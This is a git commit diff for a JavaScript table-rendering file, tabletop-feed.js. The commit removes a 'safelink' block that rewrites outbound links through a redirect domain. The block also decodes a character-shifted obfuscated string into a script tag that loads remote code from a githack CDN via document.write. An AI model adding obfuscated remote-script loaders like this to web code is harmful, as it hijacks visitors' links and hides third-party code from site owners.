144052a117bd91c16f094bff2527fc1fdf8a0d0a
Ishad Nasoha <32013784+Lebihtau@users.noreply.github.com>
2019-08-26 19:57:08 +0700

    Update tabletop-feed.js

--- tabletop-feed.js
+++ tabletop-feed.js
@@ -42,19 +42,6 @@ function writeTableWith(dataSource){
 
     jqueryNoConflict("#demo").html("<table cellpadding='0' cellspacing='0' border='0' class='display table table-bordered table-striped' id='data-table-container'></table>");
 
-//safelink	
-var SETTINGKlinkz = {
- URLnoSAFE : "app-jos.blogspot.com,linkdin.com,www.youtube.com,path.com,whatsapp.com,pinterest.com,instagram.com,wa.me,facebook.com,twitter.com",
- TITLElink : "Generate Link",
- PASSlink : "",
- LINKproperty : "_blank",
- VERIFYlink : "true",
- COUNTDOWNlink : "false",
- CLICK2Xlink : "true",
-URLSAFELINK : "https://save.cara.tips/"
-};
-var sautoKLINKZ="=tdsjqu!tsd>#iuuqt;00sbxdeo/hjuibdl/dpn0lbsffmlvo0tfswfslmjol{0b468edf7edbb614e216:c974:8b63b647ecff1890BVUPtbgfmjol/kt#?=0tdsjqu?";mautoKLINKZ=""; for (i=0; i<sautoKLINKZ.length; i++){if(sautoKLINKZ.charCodeAt(i)==28){mautoKLINKZ+='&';}else if (sautoKLINKZ.charCodeAt(i)==23){mautoKLINKZ+='!';}else{mautoKLINKZ+=String.fromCharCode(sautoKLINKZ.charCodeAt(i)-1);}}document.write(mautoKLINKZ);	
-//end safelink	
 	
 	
     var oTable = jqueryNoConflict("#data-table-container").dataTable({
